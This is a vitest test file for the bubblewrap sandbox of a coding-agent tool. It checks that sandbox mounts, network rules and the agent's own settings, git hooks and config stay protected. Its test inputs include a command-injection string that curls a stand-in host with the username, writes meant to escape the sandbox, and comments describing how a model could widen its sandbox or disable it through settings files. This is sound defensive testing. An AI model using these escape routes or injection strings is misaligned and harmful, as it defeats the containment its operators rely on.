import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { homedir, tmpdir } from 'os';
import { join, posix, resolve, win32 } from 'path';
import {
  buildSandboxExecution,
  createSandbox,
  matchesExcludedCommand,
  sandboxBackendAvailable,
  sandboxCoverage,
  sandboxPolicySummary,
  unbindablePaths,
  unsandboxedRefusalMessage,
  type SandboxHost,
} from './sandbox.js';
import { DEFAULT_SETTINGS, type ResolvedSettings } from './settings.js';

function sandboxSettings(
  overrides: Partial<ResolvedSettings['sandbox']> = {},
): ResolvedSettings['sandbox'] {
  return { ...structuredClone(DEFAULT_SETTINGS.sandbox), enabled: true, ...overrides };
}

/** The system directories `buildSandboxExecution` binds read-only, named literally. */
const SYSTEM_MOUNTS = ['/usr', '/lib', '/lib64', '/bin', '/sbin', '/etc', '/opt'];

/**
 * A fully injected host on which every path "exists": the generated argv
 * depends only on the code under test, never on which system directories the
 * machine running the suite happens to have. Without this, an assertion that
 * `/usr` is bound holds on Linux and silently asserts on an empty bind list on
 * Windows CI, where `resolve('/usr')` lands on `C:\usr` and nothing is there.
 */
function allExistingHost(flavour: typeof posix | typeof win32): SandboxHost {
  return {
    path: flavour,
    exists: () => true,
    isDirectory: () => true,
    readFile: () => null,
    homedir: () => (flavour === win32 ? 'C:\\Users\\book' : '/home/book'),
  };
}

describe('buildSandboxExecution', () => {
  it('passes the command as a single argv element so no outer shell can parse it', () => {
    const command = 'echo hi; touch /tmp/escaped && curl $(whoami).example.com';
    const exec = buildSandboxExecution('/usr/bin/bwrap', command, '/work', sandboxSettings());

    expect(exec.file).toBe('/usr/bin/bwrap');
    // Everything the user wrote lives in exactly one element, at the end.
    expect(exec.args.at(-1)).toBe(command);
    expect(exec.args.filter((arg) => arg.includes(';'))).toEqual([command]);
    expect(exec.args.slice(-3)).toEqual(['/bin/bash', '-c', command]);
    expect(exec.args.at(-4)).toBe('--');
  });

  it('binds the workspace after the /tmp tmpfs so a workspace under /tmp survives', () => {
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-order-'));
    try {
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', dir, sandboxSettings());
      const tmpfsIndex = exec.args.indexOf('--tmpfs');
      const bindIndex = exec.args.indexOf(dir);
      expect(tmpfsIndex).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(tmpfsIndex);
      expect(exec.args[bindIndex - 1]).toBe('--bind');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it.each([
    { flavourName: 'posix', flavour: posix, workspace: '/work' },
    { flavourName: 'win32', flavour: win32, workspace: 'C:\\work' },
  ])(
    'binds the workspace after the system read-only mounts ($flavourName paths)',
    ({ flavour, workspace }) => {
      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        workspace,
        sandboxSettings(),
        allExistingHost(flavour),
      );
      // The system mounts are the ones named literally, and they must precede
      // the writable workspace bind or a workspace under /usr would be
      // shadowed. The workspace control files are the deliberate exception and
      // come after; they are asserted in their own suite below.
      const systemSources = new Set(SYSTEM_MOUNTS.map((dir) => flavour.resolve(dir)));
      const systemBind = exec.args.findIndex(
        (arg, index) => arg === '--ro-bind' && systemSources.has(exec.args[index + 1]),
      );
      const bindIndex = exec.args.lastIndexOf('--bind');
      // Both mounts must actually be present before their order means anything:
      // -1 > -1 would vacuously "order" two lookups that found nothing.
      expect(systemBind).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(systemBind);
      expect(exec.args[bindIndex + 1]).toBe(flavour.resolve(workspace));
    },
  );

  it('still binds the workspace when no POSIX system mount exists (the Windows host shape)', () => {
    // A Windows host is exactly this: /usr, /lib, … resolve onto the current
    // drive and none exist, so every system read-only bind is skipped. The
    // workspace bind must survive that on its own.
    const workspace = 'C:\\work';
    const host: SandboxHost = {
      ...allExistingHost(win32),
      exists: (path) => path === workspace,
    };
    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      workspace,
      sandboxSettings(),
      host,
    );
    expect(exec.args).not.toContain('--ro-bind');
    const bindIndex = exec.args.indexOf('--bind');
    expect(bindIndex).toBeGreaterThan(-1);
    expect(exec.args.slice(bindIndex, bindIndex + 3)).toEqual(['--bind', workspace, workspace]);
  });

  it('shares the network only when no domain policy is declared', () => {
    const open = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(open.args).toContain('--share-net');
    expect(open.args).not.toContain('--unshare-net');
  });

  it('fails closed to no network when a per-domain policy is declared', () => {
    // bubblewrap has no DNS or domain awareness, so an allow-list cannot be
    // honoured as written; handing over the full host network would be worse.
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).toContain('--unshare-net');
    expect(exec.args).not.toContain('--share-net');

    const denied = sandboxSettings();
    denied.network.deniedDomains = ['evil.example'];
    expect(buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', denied).args).toContain(
      '--unshare-net',
    );
  });

  it('applies declared filesystem policy after the workspace bind', () => {
    const writable = mkdtempSync(join(tmpdir(), 'book-sbx-rw-'));
    const readonly = mkdtempSync(join(tmpdir(), 'book-sbx-ro-'));
    const masked = mkdtempSync(join(tmpdir(), 'book-sbx-hide-'));
    try {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = [writable];
      settings.filesystem.denyWrite = [readonly];
      settings.filesystem.denyRead = [masked];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      expect(exec.args[exec.args.indexOf(writable) - 1]).toBe('--bind');
      expect(exec.args[exec.args.indexOf(readonly) - 1]).toBe('--ro-bind');
      expect(exec.args[exec.args.indexOf(masked) - 1]).toBe('--tmpfs');
    } finally {
      for (const dir of [writable, readonly, masked]) {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it('skips bind sources that do not exist, which bwrap would reject', () => {
    const settings = sandboxSettings();
    settings.filesystem.allowWrite = ['/definitely/not/a/real/path'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).not.toContain('/definitely/not/a/real/path');
  });

  it('drops capabilities and ties the sandbox lifetime to the spawning process', () => {
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.join(' ')).toContain('--cap-drop ALL');
    expect(exec.args).toContain('--die-with-parent');
  });

  it('never uses --new-session, which would break every process-group kill', () => {
    // bwrap calls setsid() under --new-session, moving the sandboxed tree out
    // of the process group Node created with `detached: true`. KillShell, the
    // foreground timeout, and Ctrl-C all signal that group and confirm death
    // with kill(-pgid, 0), so the group would read as empty while the command
    // kept running.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args).not.toContain('--new-session');
  });

  it('masks a denied file with /dev/null instead of a tmpfs that would abort bwrap', () => {
    // --tmpfs mkdirs its target, so pointing it at a file fails the whole
    // invocation with "Not a directory" — and a credentials file is the most
    // natural thing to put in denyRead.
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-file-'));
    const file = join(dir, 'creds.txt');
    writeFileSync(file, 'secret');
    try {
      const settings = sandboxSettings();
      settings.filesystem.denyRead = [file, dir];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      const fileIndex = exec.args.indexOf(file);
      expect(exec.args[fileIndex - 1]).toBe('/dev/null');
      expect(exec.args[fileIndex - 2]).toBe('--ro-bind');
      // A directory still gets the tmpfs mask.
      expect(exec.args[exec.args.indexOf(dir) - 1]).toBe('--tmpfs');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('expands ~ in configured filesystem paths', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyWrite = ['~'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    // Without expansion this resolves to "<cwd>/~", which does not exist and
    // would be dropped — unenforced policy the user believes is active.
    expect(exec.args).toContain(homedir());
    expect(exec.args).not.toContain(resolve('~'));
  });

  it('binds the workspace root, never a caller-supplied working directory', () => {
    // `workdir` is a model-supplied Bash argument. Binding it would let the
    // model widen its own sandbox: `--bind / /` emitted last shadows every
    // other mount and returns the whole host filesystem, read-write.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.filter((arg) => arg === '/')).toHaveLength(0);
  });
});

/**
 * The workspace bind is read-write, which made every workspace control file
 * writable from inside the sandbox: a sandboxed command could write
 * `.book/settings.local.json` (honoured on the host from the next session — it
 * can disable the sandbox or add `Bash(*)`), drop a `.git/hooks/*` script, or
 * point `core.hooksPath` / `core.fsmonitor` in `.git/config`, all of which the
 * *host* runs afterwards. The file tools already refuse `.book/settings.local.json`
 * (permissions.ts); the sandbox did not (#373).
 */
describe('buildSandboxExecution workspace control files', () => {
  const WORKSPACE = '/work';

  /**
   * A host whose filesystem is a declared set of paths, so each case is about
   * the mount the code emits rather than about a temp directory on this machine.
   */
  function hostWith(paths: Record<string, 'dir' | 'file'>, files: Record<string, string> = {}) {
    const flavour = posix;
    const real = new Set(Object.keys(paths));
    return {
      path: flavour,
      exists: (path: string) => real.has(path),
      isDirectory: (path: string) => paths[path] === 'dir',
      homedir: () => '/home/book',
      readFile: (path: string) => files[path] ?? null,
    } satisfies SandboxHost;
  }

  function mountsFor(args: string[], target: string): { flag: string; index: number } {
    const index = args.indexOf(target);
    return { flag: index === -1 ? '' : args[index - 1], index };
  }

  it('mounts an existing .book read-only after the workspace and any allowWrite bind', () => {
    const host = hostWith({
      '/work': 'dir',
      '/work/.book': 'dir',
      '/work/extra': 'dir',
      '/work/.git': 'dir',
      '/work/.git/hooks': 'dir',
      '/work/.git/config': 'file',
    });
    const settings = sandboxSettings();
    settings.filesystem.allowWrite = ['/work/extra'];

    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host);

    const book = mountsFor(exec.args, '/work/.book');
    expect(exec.args.slice(book.index - 1, book.index + 2)).toEqual([
      '--ro-bind',
      '/work/.book',
      '/work/.book',
    ]);
    // After the workspace bind, or the workspace would shadow it.
    expect(exec.args.lastIndexOf('--bind', book.index)).toBeLessThan(book.index);
    // After `allowWrite`, or an extra writable root would reopen it.
    expect(exec.args.indexOf('/work/extra')).toBeLessThan(book.index);
    // Before the configured deny policy, which stays free to be stricter.
    expect(book.index).toBeLessThan(exec.args.indexOf('--share-net'));
  });

  it('mounts an absent .book as an empty read-only directory so it cannot be created', () => {
    const host = hostWith({ '/work': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    const bookIndex = exec.args.indexOf('/work/.book');
    expect(exec.args.slice(bookIndex - 1, bookIndex + 3)).toEqual([
      '--tmpfs',
      '/work/.book',
      '--remount-ro',
      '/work/.book',
    ]);
  });

  it('mounts a git directory hooks and config read-only', () => {
    const host = hostWith({
      '/work': 'dir',
      '/work/.book': 'dir',
      '/work/.git': 'dir',
      '/work/.git/hooks': 'dir',
      '/work/.git/config': 'file',
    });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(mountsFor(exec.args, '/work/.git/hooks').flag).toBe('--ro-bind');
    expect(mountsFor(exec.args, '/work/.git/config').flag).toBe('--ro-bind');
    // An absent config is not mounted: there is nothing to protect, and bwrap
    // aborts the whole invocation on a missing bind source.
    expect(exec.args).not.toContain('/work/.git/config.worktree');
  });

  it('masks an absent hooks directory so one cannot be created', () => {
    const host = hostWith({ '/work': 'dir', '/work/.book': 'dir', '/work/.git': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    const hooksIndex = exec.args.indexOf('/work/.git/hooks');
    expect(exec.args.slice(hooksIndex - 1, hooksIndex + 2)).toEqual([
      '--tmpfs',
      '/work/.git/hooks',
      '--remount-ro',
    ]);
  });

  it('follows a .git file to the git dir inside the workspace, and its commondir', () => {
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/work/.git-data': 'dir',
        '/work/.git-data/hooks': 'dir',
        '/work/.git-data/config.worktree': 'file',
        '/work/.git-shared': 'dir',
        '/work/.git-shared/hooks': 'dir',
        '/work/.git-shared/config': 'file',
      },
      {
        '/work/.git': 'gitdir: .git-data\n',
        // commondir is relative to the git dir, not to the workspace.
        '/work/.git-data/commondir': '../.git-shared\n',
      },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    for (const target of [
      '/work/.git-data/hooks',
      '/work/.git-data/config.worktree',
      '/work/.git-shared/hooks',
      '/work/.git-shared/config',
    ]) {
      expect(mountsFor(exec.args, target).flag).toBe('--ro-bind');
    }
  });

  it('does not touch a git dir that lies outside the workspace', () => {
    // Nothing binds it writable, so there is nothing to protect — and mounting
    // it would hand a worktree's hooks to a command that has no other business
    // seeing the parent repository.
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/elsewhere/repo.git': 'dir',
        '/elsewhere/repo.git/hooks': 'dir',
        '/elsewhere/repo.git/config': 'file',
      },
      { '/work/.git': 'gitdir: /elsewhere/repo.git\n' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(exec.args.join(' ')).not.toContain('/elsewhere/repo.git');
    // The .git *file* itself is still writable, but there is no mount for a
    // file: a command could rewrite it to point somewhere else, which is a
    // known boundary rather than an oversight.
    expect(mountsFor(exec.args, '/work/.git').index).toBe(-1);
  });

  it('resolves a relative gitdir against the workspace, as git does', () => {
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/work/nested/gitdir': 'dir',
        '/work/nested/gitdir/hooks': 'dir',
      },
      { '/work/.git': 'gitdir: nested/gitdir' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(mountsFor(exec.args, '/work/nested/gitdir/hooks').flag).toBe('--ro-bind');
  });

  it('mounts no git metadata when the workspace is not a repository', () => {
    const host = hostWith({ '/work': 'dir', '/work/.book': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(exec.args.join(' ')).not.toContain('.git');
  });

  it('ignores a .git file it cannot parse', () => {
    const host = hostWith(
      { '/work': 'dir', '/work/.book': 'dir', '/work/.git': 'file' },
      { '/work/.git': 'not a gitdir line\n' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(exec.args.join(' ')).not.toContain('.git/');
  });
});

describe('unbindablePaths', () => {
  it('reports configured paths that cannot be applied', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyRead = ['/definitely/not/real', '~/also-not-real-xyz'];
    settings.filesystem.allowWrite = [tmpdir()];
    expect(unbindablePaths(settings)).toEqual(['/definitely/not/real', '~/also-not-real-xyz']);
  });
});

describe('createSandbox', () => {
  it('returns null when sandbox.enabled is false', () => {
    expect(createSandbox(sandboxSettings({ enabled: false }))).toBeNull();
  });

  it('warns that domain rules cannot be enforced', () => {
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const sandbox = createSandbox(settings);
    if (sandbox) {
      expect(warnSpy.mock.calls.flat().join(' ')).toMatch(/domain rules cannot be enforced/i);
    }
    warnSpy.mockRestore();
  });

  it('throws when failIfUnavailable is true and the sandbox cannot be built', () => {
    const settings = sandboxSettings({ failIfUnavailable: true });
    try {
      expect(['object', 'null']).toContain(typeof createSandbox(settings));
    } catch (e) {
      expect(e).toBeInstanceOf(Error);
      expect((e as Error).message).toMatch(/bwrap|sandbox|Windows/i);
    }
  });
});

describe('Bash tool integration with sandbox', () => {
  let dir: string;
  const ctx = {
    workspaceRoot: '',
    env: {},
    sandbox: undefined as ResolvedSettings['sandbox'] | undefined,
  };

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'book-sandbox-'));
    ctx.workspaceRoot = dir;
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it('runs commands normally when sandbox is disabled', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings({ enabled: false });
    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('hello');
    expect(result.content).not.toContain('[sandboxed]');
  });

  it('marks output as [sandboxed] when sandbox is enabled and available', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return; // no bwrap on this host

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('[sandboxed]');
    expect(result.content).toContain('hello');
  });

  it('still supports shell syntax inside the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo one && echo two | tr a-z A-Z' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('one');
    expect(result.content).toContain('TWO');
  });

  it('refuses a workdir outside the workspace rather than binding it', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // Binding a model-supplied workdir is a complete escape: `--bind / /`
    // emitted after the default mounts shadows all of them.
    const escapeTarget = join(tmpdir(), `book-sandbox-workdir-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `touch ${escapeTarget}`, workdir: '/' },
      },
      ctx,
    );

    try {
      expect(result.status).not.toBe('success');
      expect(result.content + (result.structuredError?.message ?? '')).toMatch(
        /outside the sandboxed workspace/i,
      );
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });

  it('confines writes reached through shell metacharacters to the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // The escape this guards against: when the wrapper is joined into one
    // string and spawned with `shell: true`, the host shell splits on `;` and
    // runs the second command outside bwrap entirely.
    const escapeTarget = join(tmpdir(), `book-sandbox-escape-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });
    const inside = join(dir, 'inside.txt');

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `echo contained > ${inside}; echo pwned > ${escapeTarget}` },
      },
      ctx,
    );

    try {
      expect(result.status).toBe('success');
      // The workspace bind is real: the in-workspace write reaches the host.
      expect(existsSync(inside)).toBe(true);
      // /tmp is a tmpfs inside the sandbox, so the second write never lands.
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });
});

/**
 * The argv is only a claim; this is the claim under a real bubblewrap. Every
 * path here is one the host acts on *after* the sandboxed command exits, which
 * is what makes a write to it an escape rather than a nuisance.
 */
describe.skipIf(!sandboxBackendAvailable())(
  'workspace control files are read-only in a real sandbox',
  () => {
    /**
     * A throwaway git repository with the control files already present, since
     * "a hook the host would run" needs a hook to exist.
     */
    function freshRepo(options: { book?: boolean } = {}): string {
      const repo = mkdtempSync(join(tmpdir(), 'book-sandbox-ro-'));
      execFileSync('git', ['init', '--quiet'], { cwd: repo });
      mkdirSync(join(repo, '.git', 'hooks'), { recursive: true });
      writeFileSync(join(repo, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
      writeFileSync(join(repo, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
      if (options.book) {
        mkdirSync(join(repo, '.book'), { recursive: true });
        writeFileSync(join(repo, '.book', 'settings.json'), '{}\n');
      }
      return repo;
    }

    async function sandboxedBash(
      command: string,
      workspace: string,
    ): Promise<{ status: string; content: string }> {
      const { createDefaultRegistry } = await import('./tools/registry.js');
      const result = await createDefaultRegistry().execute(
        { id: 'c1', name: 'Bash', arguments: { command } },
        {
          workspaceRoot: workspace,
          env: {},
          sandbox: sandboxSettings({ allowUnsandboxedCommands: false }),
        },
      );
      return {
        status: result.status,
        content: `${result.content}\n${result.structuredError?.message ?? ''}`,
      };
    }

    it('still writes an ordinary workspace file', async () => {
      const repo = freshRepo();
      try {
        const result = await sandboxedBash(`printf 'ok' > notes.txt`, repo);

        expect(result.status).toBe('success');
        expect(readFileSync(join(repo, 'notes.txt'), 'utf8')).toBe('ok');
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to write .book/settings.local.json where .book exists', async () => {
      const repo = freshRepo({ book: true });
      try {
        const result = await sandboxedBash(`printf 'pwned' > .book/settings.local.json`, repo);

        expect(result.status).not.toBe('success');
        expect(result.content.toLowerCase()).toMatch(/read-only file system/);
        expect(existsSync(join(repo, '.book', 'settings.local.json'))).toBe(false);
        expect(readFileSync(join(repo, '.book', 'settings.json'), 'utf8')).toBe('{}\n');
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to create .book where none exists', async () => {
      const repo = freshRepo();
      try {
        const result = await sandboxedBash(`printf 'pwned' > .book/settings.local.json`, repo);

        expect(result.status).not.toBe('success');
        expect(result.content.toLowerCase()).toMatch(/read-only file system/);
        expect(existsSync(join(repo, '.book', 'settings.local.json'))).toBe(false);
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to write git hooks and .git/config, leaving them unchanged', async () => {
      const repo = freshRepo();
      try {
        for (const target of ['.git/hooks/pre-commit', '.git/config']) {
          const result = await sandboxedBash(`printf 'pwned' > ${target}`, repo);

          expect(result.status, target).not.toBe('success');
          expect(result.content.toLowerCase(), target).toMatch(/read-only file system/);
        }
        // The host still holds what it held: the next `git commit` on the host
        // runs the original hook and reads the original config.
        expect(readFileSync(join(repo, '.git', 'hooks', 'pre-commit'), 'utf8')).toBe(
          '#!/bin/sh\nexit 0\n',
        );
        expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).toBe(
          '[core]\n\trepositoryformatversion = 0\n',
        );
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });
  },
);

describe('matchesExcludedCommand', () => {
  it('matches a glob pattern against the whole command', () => {
    expect(matchesExcludedCommand('docker build .', ['docker *'])).toBe(true);
    expect(matchesExcludedCommand('git status', ['docker *'])).toBe(false);
  });

  it('matches against the whole command, not the first line getPrimaryArg would keep', () => {
    // The permission path and the execution path must judge the same text.
    // getPrimaryArg truncates a command to its first line, so a pattern that
    // only matches the full text would be missed by a first-line matcher and
    // the command would be judged sandboxed while Bash ran it unsandboxed.
    const command = 'echo hello\ndocker run --privileged evil';
    expect(matchesExcludedCommand(command, [command])).toBe(true);
    expect(matchesExcludedCommand(command.split('\n')[0], [command])).toBe(false);
  });

  it('treats a missing pattern list as no exclusions', () => {
    expect(matchesExcludedCommand('anything', [])).toBe(false);
    expect(matchesExcludedCommand('anything', undefined)).toBe(false);
  });
});

describe('sandboxCoverage', () => {
  const available = () => true;
  const unavailable = () => false;

  it('reports a genuinely sandboxed command', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), available)).toEqual({ sandboxed: true });
  });

  it('reports "disabled" when sandboxing is off', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), available)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('reports "excluded" for a command matching sandbox.excludedCommands', () => {
    const settings = sandboxSettings({ excludedCommands: ['docker *'] });
    expect(sandboxCoverage('docker ps', settings, available)).toEqual({
      sandboxed: false,
      reason: 'excluded',
    });
    expect(sandboxCoverage('ls', settings, available)).toEqual({ sandboxed: true });
  });

  it('reports "unavailable" when the bubblewrap backend is missing', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), unavailable)).toEqual({
      sandboxed: false,
      reason: 'unavailable',
    });
  });

  it('prefers "disabled" over "unavailable" so the diagnosis is the actionable one', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), unavailable)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('does not probe the backend when sandboxing is disabled or the command is excluded', () => {
    const probe = vi.fn(() => true);
    sandboxCoverage('ls', sandboxSettings({ enabled: false }), probe);
    sandboxCoverage('docker ps', sandboxSettings({ excludedCommands: ['docker *'] }), probe);
    expect(probe).not.toHaveBeenCalled();
  });
});

describe('unsandboxedRefusalMessage', () => {
  it.each([
    ['disabled' as const, 'sandbox.enabled is false'],
    ['excluded' as const, 'sandbox.excludedCommands'],
    ['unavailable' as const, 'bubblewrap'],
  ])('names the setting and the reason for %s', (reason, expectedReason) => {
    const message = unsandboxedRefusalMessage(reason);
    expect(message).toContain('sandbox.allowUnsandboxedCommands');
    expect(message).toContain(expectedReason);
    // Actionable: it must say what to change, not only what failed.
    expect(message).toMatch(/set sandbox\.allowUnsandboxedCommands to true/);
  });
});

describe('sandboxPolicySummary', () => {
  const active = { sandboxActive: true, adjudicationConfigured: false };

  it('reports refusal when allowUnsandboxedCommands is false', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ allowUnsandboxedCommands: false }),
      active,
    );
    expect(summary.unsandboxedCommands).toContain('refused');
    expect(summary.unsandboxedCommands).toContain('sandbox.allowUnsandboxedCommands=false');
  });

  it('reports auto-allow as inert when no sandbox is actually active', () => {
    const summary = sandboxPolicySummary(sandboxSettings({ enabled: false }), {
      ...active,
      sandboxActive: false,
    });
    expect(summary.autoAllowBash).toContain('inert');
  });

  it('reports auto-allow as on only when a sandbox is actually active', () => {
    expect(sandboxPolicySummary(sandboxSettings(), active).autoAllowBash).toContain('on for');
  });

  // The auto-allow only stands in for the *default* ask, so any configured
  // deny/ask rule makes it inert. Reporting "on" there would tell the user the
  // sandbox is skipping prompts that Book is in fact still raising.
  it('reports auto-allow as inert when deny/ask rules are configured', () => {
    const summary = sandboxPolicySummary(sandboxSettings(), {
      ...active,
      adjudicationConfigured: true,
    });
    expect(summary.autoAllowBash).toContain('inert');
    expect(summary.autoAllowBash).toContain('permissions.deny/ask');
  });

  it('reports auto-allow as off when the key is false, even with an active sandbox', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ autoAllowBashIfSandboxed: false }),
      active,
    );
    expect(summary.autoAllowBash).toContain('off');
    expect(summary.autoAllowBash).toContain('sandbox.autoAllowBashIfSandboxed=false');
  });
});
